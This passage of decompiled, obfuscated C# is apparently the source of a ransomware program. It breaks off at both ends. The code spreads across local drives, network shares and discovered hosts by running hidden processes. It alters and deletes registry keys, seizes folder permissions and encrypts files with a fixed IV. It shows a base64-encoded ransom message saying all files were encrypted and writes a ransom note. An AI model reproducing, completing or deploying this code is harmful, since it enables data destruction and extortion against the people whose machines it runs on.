!fileInfo.FullName.Contains(YPtXSOBdFjEyjx) && !fileInfo.FullName.Contains(wtdIqahxTNLZTaxN))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(pDpPfpDBIveZcfZ) * 1024.0 * 1024.0 && OAyGmagMWpgoWAJCw == getString_0(107396909))
						{
							list.Add(fileInfo.FullName);
							YaHDZBHivPOf(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && OAyGmagMWpgoWAJCw == getString_0(107396882))
						{
							list.Add(fileInfo.FullName);
							YaHDZBHivPOf(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string DndsNVaSUbaYiXt(string OcwKsGjeQchyv = "", string BLSxvJtFcLp = "")
	{
		string result = getString_0(107087972);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = OcwKsGjeQchyv,
				Arguments = BLSxvJtFcLp,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void zPCnkgziUrTTtuQ(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107087971),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string DqooNRqZwbOam(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string ZszvXPTYjBtgjF(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void ARtwMDRmSoKxiW(string jhuTXMyZrc = "", string TLKXDHlojbty = "SW5mb3JtYXRpb24uLi4=", string SWtyOmewarKUAMp = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		jhuTXMyZrc = DqooNRqZwbOam(getString_0(107087922));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(ZszvXPTYjBtgjF(jhuTXMyZrc), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(ZszvXPTYjBtgjF(getString_0(107087825)), ZszvXPTYjBtgjF(TLKXDHlojbty));
				registryKey.SetValue(ZszvXPTYjBtgjF(getString_0(107087792)), ZszvXPTYjBtgjF(SWtyOmewarKUAMp));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			jhuTXMyZrc = DqooNRqZwbOam(getString_0(107087763));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(ZszvXPTYjBtgjF(jhuTXMyZrc), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(ZszvXPTYjBtgjF(getString_0(107087178)), ZszvXPTYjBtgjF(TLKXDHlojbty));
				registryKey.SetValue(ZszvXPTYjBtgjF(getString_0(107087145)), ZszvXPTYjBtgjF(SWtyOmewarKUAMp));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void XqMKMEVMiaP()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (NAuVcBiAFcWa == getString_0(107396909) && !string.IsNullOrEmpty(NwYxCJSnEoN) && !string.IsNullOrEmpty(DfnXcorpnTcs))
				{
					ARtwMDRmSoKxiW(getString_0(107087972), NwYxCJSnEoN, DfnXcorpnTcs);
				}
				else
				{
					ARtwMDRmSoKxiW(getString_0(107087972), getString_0(107088579), getString_0(107088550));
				}
			}
		}
		catch
		{
		}
	}

	public static void etTkwMGpjm(string hASLNrPiRjRsr = "SW5mb3JtYXRpb24uLi4=", string BZaQXFLRoF = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(ZszvXPTYjBtgjF(hASLNrPiRjRsr));
		val.set_BalloonTipText(ZszvXPTYjBtgjF(BZaQXFLRoF));
		val.ShowBalloonTip(30000);
	}

	public static void eFoVLMfpJZsWzob(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		DndsNVaSUbaYiXt(getString_0(107087116), getString_0(107087103) + text + getString_0(107087062) + string_0);
	}

	public static List<string> jSzNNLTaeKTSc()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		ManagementClass val = new ManagementClass(getString_0(107087057));
		List<string> list = new List<string>();
		try
		{
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					object obj = ((ManagementBaseObject)val2).get_Item(getString_0(107087072));
					if (!list.Contains(getString_0(107087031) + val2.get_Path().get_Server() + getString_0(107396799) + obj.ToString()!.Replace(getString_0(107087026), getString_0(107087972)).Replace(getString_0(107087049), getString_0(107087972))))
					{
						list.Add(getString_0(107087031) + val2.get_Path().get_Server() + getString_0(107396799) + obj.ToString()!.Replace(getString_0(107087026), getString_0(107087972)).Replace(getString_0(107087049), getString_0(107087972)));
					}
				}
				return list;
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
			return null;
		}
	}

	private static void upjIfrWmXEYSDS()
	{
		//IL_0956: Unknown result type (might be due to invalid IL or missing references)
		//IL_095d: Expected O, but got Unknown
		//IL_0978: Unknown result type (might be due to invalid IL or missing references)
		//IL_097f: Expected O, but got Unknown
		slfmJnHyNG();
		dgstxCCDzAUD.ihHGaTQUJHvFN();
		vASGoBEUZmAI = dgstxCCDzAUD.znWCJngjZA();
		List<KEPmidMuhlGh> list = KEPmidMuhlGh.cdryZkpkyOlj();
		foreach (KEPmidMuhlGh item in list)
		{
			MjWiSZYWGb.Add(item.IPAddress);
		}
		YCdnHJwvmqrsRsZ = vASGoBEUZmAI.Union(MjWiSZYWGb).ToList();
		foreach (string item2 in YCdnHJwvmqrsRsZ)
		{
			if ((!item2.StartsWith(getString_0(107087040)) && !item2.StartsWith(getString_0(107087003)) && !item2.StartsWith(getString_0(107086994)) && !item2.StartsWith(getString_0(107087972))) || !dgstxCCDzAUD.buJIpKRUrvga(item2))
			{
				continue;
			}
			try
			{
				if (XTLwWuXHos == getString_0(107396909))
				{
					for (int i = 0; i < dgstxCCDzAUD.OPQbuwfYhp.Count; i++)
					{
						DndsNVaSUbaYiXt(getString_0(107087116), getString_0(107087013) + item2 + getString_0(107086972) + dgstxCCDzAUD.OPQbuwfYhp[i] + getString_0(107087062) + dgstxCCDzAUD.ACBeKEAlkFu[i]);
					}
				}
				else
				{
					DndsNVaSUbaYiXt(getString_0(107087116), getString_0(107087013) + item2 + getString_0(107086983));
				}
			}
			catch
			{
			}
		}
		try
		{
			dgstxCCDzAUD.HXUhnTWrRPoFQ hXUhnTWrRPoFQ = new dgstxCCDzAUD.HXUhnTWrRPoFQ(dgstxCCDzAUD.lasAakqUlsu.MSjtgJzzYFUVqU, dgstxCCDzAUD.jwNztBYkHZ.DshvpunFzWv, dgstxCCDzAUD.pkfyLLHbpRVd.xfoLvydXYL, dgstxCCDzAUD.wqcfzNGCqt.JogjeDOamEUsLWw);
			foreach (string item3 in hXUhnTWrRPoFQ)
			{
				MatchCollection matchCollection = Regex.Matches(item3, getString_0(107087454));
				foreach (Match item4 in matchCollection)
				{
					try
					{
						if (XTLwWuXHos == getString_0(107396909))
						{
							for (int j = 0; j < dgstxCCDzAUD.OPQbuwfYhp.Count; j++)
							{
								DndsNVaSUbaYiXt(getString_0(107087116), getString_0(107087405) + item4.ToString() + getString_0(107087396) + dgstxCCDzAUD.OPQbuwfYhp[j] + getString_0(107087062) + dgstxCCDzAUD.ACBeKEAlkFu[j]);
							}
						}
						else
						{
							DndsNVaSUbaYiXt(getString_0(107087116), getString_0(107087405) + item4.ToString() + getString_0(107087351));
						}
					}
					catch
					{
					}
					if (!JPTwqHSqmQofk.Contains(item4.ToString()))
					{
						JPTwqHSqmQofk.Add(item4.ToString());
					}
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			List<string> list2 = jSzNNLTaeKTSc();
			foreach (string item5 in list2)
			{
				if (item5.Contains(getString_0(107087346)) || item5.Contains(getString_0(107087049)) || item5.Contains(getString_0(107087373)) || item5.Contains(getString_0(107087364)) || item5.Contains(getString_0(107087026)) || item5.Contains(getString_0(107087323)) || item5.Contains(getString_0(107087342)) || item5.Contains(getString_0(107087289)) || item5.ToLower().Contains(getString_0(107088031)) || item5.ToLower().Contains(getString_0(107087986)) || item5.Contains(getString_0(107087260)) || item5.Contains(getString_0(107087271)) || item5.ToLower().Contains(getString_0(107088435)) || item5.ToLower().Contains(getString_0(107088454)) || item5.ToLower().Contains(getString_0(107088417)) || item5.ToLower().Contains(getString_0(107088376)) || item5.ToLower().Contains(getString_0(107088391)) || item5.ToLower().Contains(getString_0(107088365)) || item5.ToLower().Contains(getString_0(107088312)))
				{
					continue;
				}
				try
				{
					if (XTLwWuXHos == getString_0(107396909))
					{
						for (int k = 0; k < dgstxCCDzAUD.OPQbuwfYhp.Count; k++)
						{
							DndsNVaSUbaYiXt(getString_0(107087116), getString_0(107087405) + item5 + getString_0(107087396) + dgstxCCDzAUD.OPQbuwfYhp[k] + getString_0(107087062) + dgstxCCDzAUD.ACBeKEAlkFu[k]);
						}
					}
					else
					{
						DndsNVaSUbaYiXt(getString_0(107087116), getString_0(107087405) + item5 + getString_0(107087351));
					}
				}
				catch
				{
				}
				if (!JPTwqHSqmQofk.Contains(item5))
				{
					JPTwqHSqmQofk.Add(item5);
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = DqooNRqZwbOam(getString_0(107087763));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(ZszvXPTYjBtgjF(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(ZszvXPTYjBtgjF(getString_0(107087226)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(ZszvXPTYjBtgjF(getString_0(107086689)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (szncKbDkEgMPP == getString_0(107396909))
		{
			try
			{
				string text = Path.GetTempFileName().Replace(getString_0(107086612), getString_0(107086635));
				File.WriteAllText(text, ZszvXPTYjBtgjF(getString_0(107086626)), Encoding.ASCII);
				DndsNVaSUbaYiXt(getString_0(107396762), getString_0(107118308) + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107118303))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107118303)));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107118262))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107118262)));
				}
			}
			catch
			{
			}
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107118285));
		ManagementObjectEnumerator enumerator6 = val.Get().GetEnumerator();
		try
		{
			while (enumerator6.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator6.get_Current();
				if (!JPTwqHSqmQofk.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107087031), getString_0(107396799)).Replace(getString_0(107118200), getString_0(107087031))
					.Replace(getString_0(107087351), getString_0(107087972))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					JPTwqHSqmQofk.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107087031), getString_0(107396799)).Replace(getString_0(107118200), getString_0(107087031))
						.Replace(getString_0(107087351), getString_0(107087972))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107087026), getString_0(107087972)) + getString_0(107118191));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator6)?.Dispose();
		}
	}

	public static bool rgGfHrTNqBWHXWhv()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107118214));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void KoKFpIzICEddc(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = ZszvXPTYjBtgjF(getString_0(107118693));
		processStartInfo.Arguments = getString_0(107118664) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool VxPVaVfBRTNH(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool aMnbgLccTi(string string_0)
	{
		try
		{
			coqMoxQsOKsNww CS_0024_003C_003E8__locals0 = new coqMoxQsOKsNww();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.YebcbRJTLVZ = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.YebcbRJTLVZ);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107118659);
		}
		catch
		{
			return false;
		}
	}

	public static string hIWmgCgTMWgc(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void NstGhHwsRy()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = DqooNRqZwbOam(getString_0(107118618));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(ZszvXPTYjBtgjF(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(ZszvXPTYjBtgjF(getString_0(107118480)));
					registryKey.DeleteSubKey(ZszvXPTYjBtgjF(getString_0(107118455)));
					registryKey.DeleteSubKey(ZszvXPTYjBtgjF(getString_0(107118470)));
					registryKey.DeleteSubKey(ZszvXPTYjBtgjF(getString_0(107117933)));
					registryKey.DeleteSubKey(ZszvXPTYjBtgjF(getString_0(107118693)));
					registryKey.DeleteSubKey(ZszvXPTYjBtgjF(getString_0(107117876)));
					registryKey.DeleteSubKey(ZszvXPTYjBtgjF(getString_0(107117847)));
					registryKey.Close();
				}
				string_ = DqooNRqZwbOam(getString_0(107117862));
				registryKey = Registry.LocalMachine.OpenSubKey(ZszvXPTYjBtgjF(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(ZszvXPTYjBtgjF(getString_0(107117765)));
					registryKey.Close();
				}
				string_ = DqooNRqZwbOam(getString_0(107117716));
				registryKey = Registry.LocalMachine.OpenSubKey(ZszvXPTYjBtgjF(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(ZszvXPTYjBtgjF(getString_0(107117765)));
					registryKey.Close();
				}
				string_ = DqooNRqZwbOam(getString_0(107117716));
				registryKey = Registry.CurrentUser.OpenSubKey(ZszvXPTYjBtgjF(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(ZszvXPTYjBtgjF(getString_0(107117765)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(getString_0(107117731)), ZszvXPTYjBtgjF(getString_0(107117682)));
			DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(getString_0(107118177)), ZszvXPTYjBtgjF(getString_0(107118136)));
			DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(getString_0(107118177)), ZszvXPTYjBtgjF(getString_0(107118022)));
			DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(getString_0(107117961)), ZszvXPTYjBtgjF(getString_0(107117400)));
		}
		catch
		{
		}
	}

	public static void cSThTETOguBcBoOS(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(ZszvXPTYjBtgjF(getString_0(107117327)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void FLdjBVawwJEcO()
	{
		string string_ = DqooNRqZwbOam(getString_0(107117302));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(ZszvXPTYjBtgjF(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(ZszvXPTYjBtgjF(getString_0(107117253)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void slfmJnHyNG()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(getString_0(107397163)), ZszvXPTYjBtgjF(getString_0(107397118)));
			DndsNVaSUbaYiXt(ZszvXPTYjBtgjF(getString_0(107397163)), ZszvXPTYjBtgjF(getString_0(107117220)));
		}
	}

	public static void VoAMpxkTccTxi()
	{
		DndsNVaSUbaYiXt(getString_0(107396762), ZszvXPTYjBtgjF(getString_0(107117554)));
		string text = ZszvXPTYjBtgjF(getString_0(107116848));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107087351) + text + getString_0(107087351) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396762);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void bvXmiHFimEQvc(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (WUCUbinjeq)
			{
				try
				{
					File.AppendAllText(YPtXSOBdFjEyjx, getString_0(107116783) + string_0 + getString_0(107116806) + ex.Message + getString_0(107396255));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string aDRTZBCTUt()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107087972);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107116717);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107116740))) ? getString_0(107116690) : getString_0(107116699));
				break;
			case 0:
				text = getString_0(107116745);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107116712);
				break;
			case 4:
				text = getString_0(107116667);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107116681) : getString_0(107116658));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107117142) : getString_0(107395845)) : getString_0(107117147)) : getString_0(107116676));
				break;
			case 10:
				text = getString_0(107117137);
				break;
			}
		}
		if (text != getString_0(107087972))
		{
			text = getString_0(107117164) + text;
			if (oSVersion.ServicePack != getString_0(107087972))
			{
				text = text + getString_0(107087062) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string jyiyuULBUnIh(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107411871);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(ZszvXPTYjBtgjF(getString_0(107411294)));
				streamWriter.WriteLine(getString_0(107396255));
				streamWriter.WriteLine(ZszvXPTYjBtgjF(getString_0(107407508)));
				streamWriter.WriteLine(string_0);
				if (SWTAoziGpJs)
				{
					streamWriter.WriteLine(getString_0(107396255));
					streamWriter.WriteLine(ZszvXPTYjBtgjF(getString_0(107407942)));
					streamWriter.WriteLine(GtRYKNkRmbf.iFtjToyyGJbdg());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !kzxgomJEqSw)
				{
					File.AppendAllText(text, getString_0(107407909) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (WUCUbinjeq)
			{
				try
				{
					File.AppendAllText(YPtXSOBdFjEyjx, getString_0(107117151) + ex.Message + getString_0(107396255));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void CxWJacaJapKKyRh(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		opEUSGhekibpe.PPgvMtINLRXZ CS_0024_003C_003E8__locals0 = new opEUSGhekibpe();
		CS_0024_003C_003E8__locals0.uOkhpLshTyLnajomxA = string_1;
		CS_0024_003C_003E8__locals0.NrlUsEOMHlLHF = string_2;
		CS_0024_003C_003E8__locals0.sJSNFTDCiAYGw = string_3;
		CS_0024_003C_003E8__locals0.eFBbXqCzejjfa = string_4;
		cIuCDrbwXuOW = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.sJSNFTDCiAYGw);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396552))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !JPTwqHSqmQofk.Contains(array[i].Name))
					{
						JPTwqHSqmQofk.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!JPTwqHSqmQofk.Contains(string_0[j]))
				{
					JPTwqHSqmQofk.Add(string_0[j]);
				}
			}
		}
		if (JPTwqHSqmQofk.Contains(ZszvXPTYjBtgjF(getString_0(107117094))) && kMYmdrxKBXb == getString_0(107396909))
		{
			JPTwqHSqmQofk.Remove(ZszvXPTYjBtgjF(getString_0(107117094)));
		}
		Parallel.ForEach(JPTwqHSqmQofk, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new opEUSGhekibpe.PPgvMtINLRXZ();
			CS_0024_003C_003E8__locals0.XXNBoOrvVI = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.CmApvDsTkVQdDmOKbq = string_0;
			if (gEajYrRefTMmPd && !aDRTZBCTUt().Contains(opEUSGhekibpe.getString_0(107116691)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						VxPVaVfBRTNH(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.CmApvDsTkVQdDmOKbq);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (HjogaXQARCSKCJ == opEUSGhekibpe.getString_0(107396919))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					SIFiImBWwIXLvUKR(CS_0024_003C_003E8__locals0.CmApvDsTkVQdDmOKbq, CS_0024_003C_003E8__locals0.XXNBoOrvVI.uOkhpLshTyLnajomxA, CS_0024_003C_003E8__locals0.XXNBoOrvVI.eFBbXqCzejjfa, CS_0024_003C_003E8__locals0.XXNBoOrvVI.NrlUsEOMHlLHF, CS_0024_003C_003E8__locals0.XXNBoOrvVI.sJSNFTDCiAYGw);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				SIFiImBWwIXLvUKR(CS_0024_003C_003E8__locals0.CmApvDsTkVQdDmOKbq, CS_0024_003C_003E8__locals0.uOkhpLshTyLnajomxA, CS_0024_003C_003E8__locals0.eFBbXqCzejjfa, CS_0024_003C_003E8__locals0.NrlUsEOMHlLHF, CS_0024_003C_003E8__locals0.sJSNFTDCiAYGw);
			}
		});
	}

	public static void SIFiImBWwIXLvUKR(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107087972));
		List<string> list3 = list2;
		if (TxXiGDwYtdTBy == getString_0(107396882))
		{
			if (EZZKZrHTpoTaL == getString_0(107396909) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && aMnbgLccTi(string_0))
			{
				sYJePUUjEUWKEO sYJePUUjEUWKEO = null;
				try
				{
					sYJePUUjEUWKEO = new sYJePUUjEUWKEO(string_0.Replace(getString_0(107396799), getString_0(107087972)));
				}
				catch
				{
					list = XdTwtlMADQST(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					YaHDZBHivPOf(sYJePUUjEUWKEO.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = XdTwtlMADQST(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = XdTwtlMADQST(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = btVBxWBDGMu.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0457;
					}
				}
				if ((seHvuluwnSdiPD == getString_0(107396882) && !item.EndsWith(text)) || iqVERQUhagNsiaC.Contains(item))
				{
					continue;
				}
				if (gZQfvzYpbFm == getString_0(107396909))
				{
					try
					{
						if (LKzunSqPvQl.OqOYRyhEkO(item))
						{
							LKzunSqPvQl.jdGybWbavTdA(item);
						}
					}
					catch
					{
					}
				}
				iqVERQUhagNsiaC.Add(item);
				if (!LJCJcQbJapSHJR.Contains(Path.GetDirectoryName(item)))
				{
					LJCJcQbJapSHJR.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (mDoYpgRrDTVMHT == getString_0(107396909) && fileStream.Length > Convert.ToInt32(lpATBSWKaW) * 1024 * 1024 && !list3.Contains(text))
					{
						if (pAvlEUMGUOUVcdb == getString_0(107396909))
						{
							foreach (string item2 in RrzUCivKfrsaJ)
							{
								if (item.ToLower().EndsWith(item2) && ARdYTzaLyCQej == getString_0(107396909))
								{
									if (Convert.ToInt32(zxDCvygXmLZs) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											GtRYKNkRmbf.WWRIlNqXKavKj(getString_0(107089448), getString_0(107089443), getString_0(107089398), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && ARdYTzaLyCQej == getString_0(107396882))
								{
									try
									{
										GtRYKNkRmbf.WWRIlNqXKavKj(getString_0(107089448), getString_0(107089443), getString_0(107089398), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = UMakmguwDziAz.DfejPHmIhOnY(item, Convert.ToInt32(lpATBSWKaW) * 1024 * 1024);
						byte[] fWRwXzgCAjjaTG = UMakmguwDziAz.YfzRuKIVSlIggFhc(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						UMakmguwDziAz.nkwBxgmWNRASp(item, fWRwXzgCAjjaTG);
						if (string_2 != getString_0(107117053))
						{
